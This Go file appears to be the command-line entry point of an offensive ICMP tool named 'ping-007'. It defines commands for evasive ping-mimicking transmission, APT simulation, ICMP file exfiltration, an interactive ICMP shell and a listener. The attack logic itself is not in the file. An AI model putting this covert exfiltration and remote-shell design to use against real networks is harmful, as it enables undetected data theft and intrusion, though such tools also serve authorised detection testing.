package main

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	mathrand "math/rand"
	"os"
	"os/signal"
	"syscall"
	"time"

	"ping007/internal/config"
	"ping007/internal/logger"
	"ping007/internal/orchestrator"

	"github.com/spf13/cobra"
)

var (
	version   = "2.0.0"
	buildTime = "unknown"
	commit    = "unknown"
)

// needsRootPrivileges determines if a command requires root access
func needsRootPrivileges(args []string) bool {
	if len(args) < 2 {
		return false // No command = help, doesn't need root
	}

	command := args[1]

	unprivilegedCommands := map[string]bool{
		"help":       true,
		"--help":     true,
		"-h":         true,
		"version":    true,
		"--version":  true,
		"completion": true,
		"keygen":     true,  // Keygen doesn't need raw sockets
	}

	if unprivilegedCommands[command] {
		return false
	}

	// status can work in limited mode
	if command == "status" {
		// Check if --no-network flag is present
		for _, arg := range args {
			if arg == "--no-network" || arg == "--safe" {
				return false
			}
		}
	}

	// Special case: analyze can work in passive mode
	if command == "analyze" {
		// Check if --passive flag is present
		for _, arg := range args {
			if arg == "--passive" || arg == "--safe" {
				return false
			}
		}
	}

	// All other commands need root for raw sockets
	return true
}

func main() {
	// Setup signal handling
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	// Initialize configuration
	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error loading config: %v\n", err)
		os.Exit(1)
	}

	// Initialize logger
	log := logger.New(cfg.Framework.LogLevel)

	// Check if command requires root privileges
	requiresRoot := needsRootPrivileges(os.Args)
	if requiresRoot && os.Geteuid() != 0 {
		fmt.Println("This operation requires root privileges for raw socket operations")
		fmt.Println("Please run with sudo: sudo ping-007")
		os.Exit(1)
	}

	// Initialize orchestrator (with privileged mode flag)
	privilegedMode := os.Geteuid() == 0
	orch, err := orchestrator.NewWithPrivileges(cfg, log, privilegedMode)
	if err != nil {
		log.Error("Failed to initialize orchestrator", "error", err)
		os.Exit(1)
	}
	defer orch.Close()

	// Create root command
	rootCmd := &cobra.Command{
		Use:     "ping-007",
		Short:   "Licensed to Ping: ICMP Stealth Operations",
		Long:    "Professional ICMP framework for offensive security and detection testing",
		Version: fmt.Sprintf("%s (build %s, commit %s)", version, buildTime, commit),
	}

	// Add commands
	rootCmd.AddCommand(
		createStatusCmd(orch),
		createBasicCmd(orch),
		createStealthCmd(orch),
		createAPTCmd(orch),
		createExfilCmd(orch),
		createShellCmd(orch),
		createListenCmd(orch),
		createAnalyzeCmd(orch),
		createKeygenCmd(),
	)

	// Global flags
	rootCmd.PersistentFlags().StringP("config", "c", "", "config file path")
	rootCmd.PersistentFlags().BoolP("verbose", "v", false, "verbose output")
	rootCmd.PersistentFlags().Bool("no-banner", false, "suppress banner")
	rootCmd.PersistentFlags().StringP("password", "p", "", "shared password for encryption (if not set, uses random keys)")

	// Execute
	if err := rootCmd.ExecuteContext(ctx); err != nil {
		log.Error("Command execution failed", "error", err)
		os.Exit(1)
	}
}

func createStatusCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "status",
		Short: "Show framework status",
		RunE: func(cmd *cobra.Command, args []string) error {
			noNetwork, _ := cmd.Flags().GetBool("no-network")
			safe, _ := cmd.Flags().GetBool("safe")

			// Create status options
			options := &orchestrator.StatusOptions{
				SafeMode:  safe || noNetwork,
				NoNetwork: noNetwork || safe,
			}

			return orch.StatusWithOptions(cmd.Context(), options)
		},
	}

	cmd.Flags().Bool("no-network", false, "disable network operations (no root required)")
	cmd.Flags().Bool("safe", false, "safe mode - no privileged operations")

	return cmd
}

func createBasicCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "basic",
		Short: "Basic ICMP transmission",
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			data, _ := cmd.Flags().GetString("data")
			interactive, _ := cmd.Flags().GetBool("interactive")
			stealth, _ := cmd.Flags().GetBool("stealth")
			signature, _ := cmd.Flags().GetString("signature")
			noSignature, _ := cmd.Flags().GetBool("no-signature")
			delay, _ := cmd.Flags().GetDuration("delay")
			humanTiming, _ := cmd.Flags().GetBool("human-timing")
			ultraStealth, _ := cmd.Flags().GetBool("ultra-stealth")
			keyfile, _ := cmd.Flags().GetString("keyfile")
			generateKey, _ := cmd.Flags().GetBool("generate-key")
			password, _ := cmd.Flags().GetString("password")

			// Handle signature options
			if noSignature || signature == "none" {
				signature = "none"
				stealth = false // Disable stealth if no signature
			}

			// Handle ultra-stealth mode
			if ultraStealth {
				stealth = true
				humanTiming = true
				if signature == "none" {
					signature = "linux" // Force signature for stealth
				}
			}

			// Apply timing delay
			if delay > 0 {
				fmt.Printf("Applying transmission delay: %v\n", delay)
				time.Sleep(delay)
			} else if humanTiming {
				humanDelay := time.Duration(mathrand.Intn(4000)+1000) * time.Millisecond // 1-5s
				fmt.Printf("Human timing simulation: %v\n", humanDelay)
				time.Sleep(humanDelay)
			}

			// Handle key generation
			if generateKey {
				keyfilePath := keyfile
				if keyfilePath == "" {
					keyfilePath = "ping007.key"
				}
				if err := generateKeyFile(keyfilePath); err != nil {
					return fmt.Errorf("failed to generate key file: %w", err)
				}
				fmt.Printf("Generated 256-bit key: %s\n", keyfilePath)
				return nil
			}

			// Set shared password or load keyfile
			if password != "" && keyfile != "" {
				return fmt.Errorf("cannot use both --password and --keyfile")
			} else if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			} else if keyfile != "" {
				keyData, err := loadKeyFile(keyfile)
				if err != nil {
					return fmt.Errorf("failed to load key file: %w", err)
				}
				// Convert key to hex-based password for compatibility
				keyPassword := fmt.Sprintf("keyfile:%x", keyData)
				if err := orch.SetPassword(keyPassword); err != nil {
					return fmt.Errorf("failed to set key: %w", err)
				}
				fmt.Printf("Loaded key from: %s\n", keyfile)
			} else {
				fmt.Printf("Warning: No password or keyfile - using random keys (non-interoperable)\n")
			}

			return orch.Basic(cmd.Context(), &orchestrator.BasicOptions{
				Target:      target,
				Data:        data,
				Interactive: interactive,
				Stealth:     stealth,
				Signature:   signature,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address (required)")
	cmd.Flags().StringP("data", "d", "", "data to transmit")
	cmd.Flags().BoolP("interactive", "i", false, "interactive mode")
	cmd.Flags().BoolP("stealth", "s", false, "stealth mode - mimics legitimate ping (64 bytes, proper timing)")
	cmd.Flags().String("signature", "linux", "OS signature to mimic (linux, windows, none)")
	cmd.Flags().Bool("no-signature", false, "disable OS signature imitation (raw ICMP)")
	cmd.Flags().Duration("delay", 0, "delay before transmission (e.g., 2s, 500ms)")
	cmd.Flags().Bool("human-timing", false, "use human-like timing patterns (1-5s random)")
	cmd.Flags().Bool("ultra-stealth", false, "enable maximum evasion (timing + size + pattern)")
	cmd.Flags().String("keyfile", "", "path to pre-shared key file (alternative to password)")
	cmd.Flags().Bool("generate-key", false, "generate new 256-bit key file")
	cmd.MarkFlagRequired("target")

	return cmd
}

func createStealthCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "stealth",
		Short: "Stealth transmission with evasion",
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			data, _ := cmd.Flags().GetString("data")
			password, _ := cmd.Flags().GetString("password")

			// Set shared password if provided
			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Stealth(cmd.Context(), &orchestrator.StealthOptions{
				Target: target,
				Data:   data,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address (required)")
	cmd.Flags().StringP("data", "d", "", "data to transmit")
	cmd.MarkFlagRequired("target")

	return cmd
}

func createAPTCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "apt",
		Short: "APT simulation mode",
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			profile, _ := cmd.Flags().GetString("profile")
			duration, _ := cmd.Flags().GetInt("duration")
			password, _ := cmd.Flags().GetString("password")

			// Set shared password if provided
			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.APT(cmd.Context(), &orchestrator.APTOptions{
				Target:   target,
				Profile:  profile,
				Duration: duration,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address (required)")
	cmd.Flags().StringP("profile", "r", "", "APT profile (lazarus,apt29,apt28,equation) (required)")
	cmd.Flags().Int("duration", 60, "simulation duration in seconds")
	cmd.MarkFlagRequired("target")
	cmd.MarkFlagRequired("profile")

	return cmd
}

func createExfilCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "exfil",
		Short: "Data exfiltration mode",
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			file, _ := cmd.Flags().GetString("file")
			method, _ := cmd.Flags().GetString("method")
			mode, _ := cmd.Flags().GetString("mode")
			chunkSize, _ := cmd.Flags().GetInt("chunk-size")
			noStealth, _ := cmd.Flags().GetBool("no-stealth")
			noEncrypt, _ := cmd.Flags().GetBool("no-encrypt")
			password, _ := cmd.Flags().GetString("password")

			// Set shared password if provided
			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Exfiltrate(cmd.Context(), &orchestrator.ExfilOptions{
				Target:    target,
				File:      file,
				Method:    method,
				Mode:      mode,
				ChunkSize: chunkSize,
				Stealth:   !noStealth,
				Encrypt:   !noEncrypt,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address (required)")
	cmd.Flags().StringP("file", "f", "", "file to exfiltrate (required)")
	cmd.Flags().String("method", "icmp_tunnel", "exfiltration method (icmp_tunnel,icmp_payload)")
	cmd.Flags().String("mode", "stealth", "exfiltration mode (stealth,fast,covert)")
	cmd.Flags().Int("chunk-size", 512, "chunk size in bytes")
	cmd.Flags().Bool("no-stealth", false, "disable stealth techniques")
	cmd.Flags().Bool("no-encrypt", false, "disable encryption")
	cmd.MarkFlagRequired("target")
	cmd.MarkFlagRequired("file")

	return cmd
}

func createShellCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "shell",
		Short: "Interactive ICMP shell",
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			mode, _ := cmd.Flags().GetString("mode")
			password, _ := cmd.Flags().GetString("password")

			// Set shared password if provided
			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Shell(cmd.Context(), &orchestrator.ShellOptions{
				Target: target,
				Mode:   mode,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address (required)")
	cmd.Flags().String("mode", "interactive", "shell mode (interactive,batch)")
	cmd.MarkFlagRequired("target")

	return cmd
}

func createListenCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "listen",
		Short: "Data listener mode",
		RunE: func(cmd *cobra.Command, args []string) error {
			iface, _ := cmd.Flags().GetString("interface")
			output, _ := cmd.Flags().GetString("output")
			method, _ := cmd.Flags().GetString("method")
			timeout, _ := cmd.Flags().GetInt("timeout")
			password, _ := cmd.Flags().GetString("password")

			// Set shared password if provided
			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Listen(cmd.Context(), &orchestrator.ListenOptions{
				Interface: iface,
				Output:    output,
				Method:    method,
				Timeout:   timeout,
			})
		},
	}

	cmd.Flags().String("interface", "eth0", "network interface")
	cmd.Flags().StringP("output", "o", "./received", "output directory")
	cmd.Flags().String("method", "icmp_tunnel", "listen method")
	cmd.Flags().Int("timeout", 60, "timeout in seconds")

	return cmd
}

func createAnalyzeCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "analyze",
		Short: "Network analysis mode",
		RunE: func(cmd *cobra.Command, args []string) error {
			duration, _ := cmd.Flags().GetInt("duration")
			passive, _ := cmd.Flags().GetBool("passive")

			return orch.Analyze(cmd.Context(), &orchestrator.AnalyzeOptions{
				Duration: duration,
				Passive:  passive,
			})
		},
	}

	cmd.Flags().Int("duration", 60, "analysis duration in seconds")
	cmd.Flags().Bool("passive", false, "passive mode - no raw sockets (no root required)")

	return cmd
}

func createKeygenCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "keygen",
		Short: "Generate cryptographic key files",
		RunE: func(cmd *cobra.Command, args []string) error {
			output, _ := cmd.Flags().GetString("output")
			keySize, _ := cmd.Flags().GetInt("size")
			format, _ := cmd.Flags().GetString("format")
			force, _ := cmd.Flags().GetBool("force")

			if output == "" {
				output = "ping007.key"
			}

			// Check if file exists
			if !force {
				if _, err := os.Stat(output); err == nil {
					return fmt.Errorf("file %s already exists, use --force to overwrite", output)
				}
			}

			// Generate key based on format
			switch format {
			case "binary":
				if err := generateKeyFileWithSize(output, keySize); err != nil {
					return fmt.Errorf("failed to generate binary key: %w", err)
				}
				fmt.Printf("Generated %d-bit binary key: %s\n", keySize*8, output)
			case "hex":
				if err := generateHexKeyFile(output, keySize); err != nil {
					return fmt.Errorf("failed to generate hex key: %w", err)
				}
				fmt.Printf("Generated %d-bit hex key: %s\n", keySize*8, output)
			case "base64":
				if err := generateBase64KeyFile(output, keySize); err != nil {
					return fmt.Errorf("failed to generate base64 key: %w", err)
				}
				fmt.Printf("Generated %d-bit base64 key: %s\n", keySize*8, output)
			default:
				return fmt.Errorf("unsupported format: %s (supported: binary, hex, base64)", format)
			}

			// Display security info
			fmt.Printf("Key entropy: %d bits\n", keySize*8)
			fmt.Printf("File permissions: 0600 (owner read/write only)\n")
			fmt.Printf("Usage: --keyfile %s\n", output)

			return nil
		},
	}

	cmd.Flags().StringP("output", "o", "", "output key file path (default: ping007.key)")
	cmd.Flags().IntP("size", "s", 32, "key size in bytes (32=256bit, 16=128bit)")
	cmd.Flags().String("format", "binary", "key format (binary, hex, base64)")
	cmd.Flags().Bool("force", false, "overwrite existing key file")

	return cmd
}

// generateKeyFile creates a new cryptographic key file
func generateKeyFile(path string) error {
	key := make([]byte, 32) // 256 bits
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("failed to generate random key: %w", err)
	}

	if err := os.WriteFile(path, key, 0600); err != nil {
		return fmt.Errorf("failed to write key file: %w", err)
	}

	return nil
}

// generateKeyFileWithSize creates a new cryptographic key file with specific size
func generateKeyFileWithSize(path string, keySize int) error {
	key := make([]byte, keySize)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("failed to generate random key: %w", err)
	}

	if err := os.WriteFile(path, key, 0600); err != nil {
		return fmt.Errorf("failed to write key file: %w", err)
	}

	return nil
}

// generateHexKeyFile creates a hex-encoded key file
func generateHexKeyFile(path string, keySize int) error {
	key := make([]byte, keySize)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("failed to generate random key: %w", err)
	}

	hexKey := fmt.Sprintf("%x", key)
	if err := os.WriteFile(path, []byte(hexKey), 0600); err != nil {
		return fmt.Errorf("failed to write hex key file: %w", err)
	}

	return nil
}

// generateBase64KeyFile creates a base64-encoded key file
func generateBase64KeyFile(path string, keySize int) error {
	key := make([]byte, keySize)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("failed to generate random key: %w", err)
	}

	base64Key := base64.StdEncoding.EncodeToString(key)
	if err := os.WriteFile(path, []byte(base64Key), 0600); err != nil {
		return fmt.Errorf("failed to write base64 key file: %w", err)
	}

	return nil
}

// loadKeyFile reads a cryptographic key from file (supports variable sizes)
func loadKeyFile(path string) ([]byte, error) {
	keyData, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read key file: %w", err)
	}

	// Support variable key sizes (128-bit to 512-bit)
	if len(keyData) < 16 || len(keyData) > 64 {
		return nil, fmt.Errorf("invalid key size: expected 16-64 bytes, got %d", len(keyData))
	}

	// If key is not 32 bytes, we'll pad or truncate to 32 bytes for compatibility
	if len(keyData) != 32 {
		normalizedKey := make([]byte, 32)
		if len(keyData) < 32 {
			// Pad smaller keys with zeros (not ideal, but functional)
			copy(normalizedKey, keyData)
		} else {
			// Truncate larger keys to 32 bytes
			copy(normalizedKey, keyData[:32])
		}
		fmt.Printf("Warning: Key size normalized from %d to 32 bytes\n", len(keyData))
		return normalizedKey, nil
	}

	return keyData, nil
}